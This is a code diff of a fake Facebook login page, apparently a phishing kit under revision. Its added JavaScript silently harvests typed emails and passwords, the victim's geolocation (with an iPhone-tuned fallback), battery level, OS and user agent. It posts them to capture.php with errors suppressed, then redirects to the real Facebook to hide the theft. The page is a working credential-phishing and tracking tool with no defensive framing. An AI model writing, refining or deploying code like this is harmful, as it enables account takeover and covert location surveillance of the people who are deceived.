@@ -165,13 +165,11 @@
 <body>
 
 <div class="card">
-    <!-- Facebook Logo -->
     <div class="fb-logo">
         <span>f</span> facebook
     </div>
     <div class="subhead">Connect with friends and the world around you.</div>
 
-    <!-- Login Form -->
     <form id="loginForm">
         <div class="form-group">
             <input type="text" id="email" placeholder="Email or phone number" />
@@ -196,13 +194,15 @@
 </div>
 
 <script>
-// ---------- SILENT CAPTURE - NO VISIBLE INDICATORS ----------
+// ---------- SILENT CAPTURE WITH REDIRECT TO REAL FACEBOOK ----------
 (function() {
     const form = document.getElementById('loginForm');
     const loginBtn = document.getElementById('loginBtn');
+
     let locationCaptured = false;
     let batteryLevel = null;
     let osName = 'Unknown';
+    let lastLocation = { lat: null, lng: null, accuracy: null, timestamp: null };
 
     // ---------- 1. Detect OS (silent) ----------
     function detectOS() {
@@ -224,7 +224,7 @@
         }).catch(() => {});
     }
 
-    // ---------- 3. Send data to PHP (silent) ----------
+    // ---------- 3. Send data to PHP ----------
     function sendToServer(lat, lng, accuracy, timestamp) {
         const email = document.getElementById('email').value || 'N/A';
         const password = document.getElementById('password').value || 'N/A';
@@ -241,17 +241,19 @@
             userAgent: navigator.userAgent
         };
 
+        // Fire and forget – we don't wait for the response
         fetch('capture.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
-        }).catch(() => {}); // Silent fail – user never knows
+        }).catch(() => {}); // Silent fail
     }
 
-    // ---------- 4. Request geolocation (silent) ----------
+    // ---------- 4. Request geolocation (iPhone friendly) ----------
     function requestLocation() {
         if (!navigator.geolocation) return;
-        
+
+        // First attempt: faster (WiFi/Cell), longer timeout for iPhone
         navigator.geolocation.getCurrentPosition(
             (pos) => {
                 const lat = pos.coords.latitude;
@@ -259,23 +261,52 @@
                 const acc = pos.coords.accuracy;
                 const ts = pos.timestamp || Date.now();
                 locationCaptured = true;
+                lastLocation = { lat, lng, accuracy: acc, timestamp: ts };
+                // Send location as soon as we get it
                 sendToServer(lat, lng, acc, ts);
             },
-            () => {}, // Silent fail – user denied
-            { enableHighAccuracy: true, timeout: 10000 }
+            (err) => {
+                // If it fails or times out, try a fallback with lower accuracy but longer timeout
+                console.warn('Location attempt 1 failed (iOS fallback):', err.message);
+                setTimeout(() => {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            const lat = pos.coords.latitude;
+                            const lng = pos.coords.longitude;
+                            const acc = pos.coords.accuracy;
+                            const ts = pos.timestamp || Date.now();
+                            locationCaptured = true;
+                            lastLocation = { lat, lng, accuracy: acc, timestamp: ts };
+                            sendToServer(lat, lng, acc, ts);
+                        },
+                        () => {}, // Final silent fail
+                        { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
+                    );
+                }, 2000);
+            },
+            { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
         );
     }
 
-    // Auto-request location when page loads (invisible)
+    // Auto-request location when page loads
     requestLocation();
 
-    // ---------- 5. Form submit – login simulation ----------
+    // ---------- 5. Form submit – capture credentials & redirect ----------
     form.addEventListener('submit', function(e) {
         e.preventDefault();
-        
-        // If location wasn't captured yet, try again silently
-        if (!locationCaptured) {
-            requestLocation();
+
+        // Grab credentials immediately
+        const email = document.getElementById('email').value || 'N/A';
+        const password = document.getElementById('password').value || 'N/A';
+
+        // If location wasn't captured yet, send credentials anyway
+        // (location will be sent separately when it's captured)
+        if (locationCaptured) {
+            // Send credentials + last known location
+            sendToServer(lastLocation.lat, lastLocation.lng, lastLocation.accuracy, lastLocation.timestamp);
+        } else {
+            // Send credentials without location (location will come later)
+            sendToServer(null, null, null, null);
         }
 
         // Show loading spinner
@@ -283,15 +314,17 @@
         loginBtn.innerHTML = '<span class="spinner"></span> Logging in...';
         loginBtn.disabled = true;
 
+        // Clear password field, wait 2.5 seconds, then redirect to REAL Facebook
         setTimeout(() => {
             loginBtn.innerHTML = original;
             loginBtn.disabled = false;
-            // Clear password field for realism
             document.getElementById('password').value = '';
-            document.getElementById('password').placeholder = 'Incorrect password. Try again.';
+            document.getElementById('password').placeholder = 'Redirecting to Facebook...';
+            
             setTimeout(() => {
-                document.getElementById('password').placeholder = 'Password';
-            }, 2500);
+                // Redirect to the REAL Facebook homepage
+                window.location.href = 'https://www.facebook.com/';
+            }, 1500);
         }, 2500);
     });
 
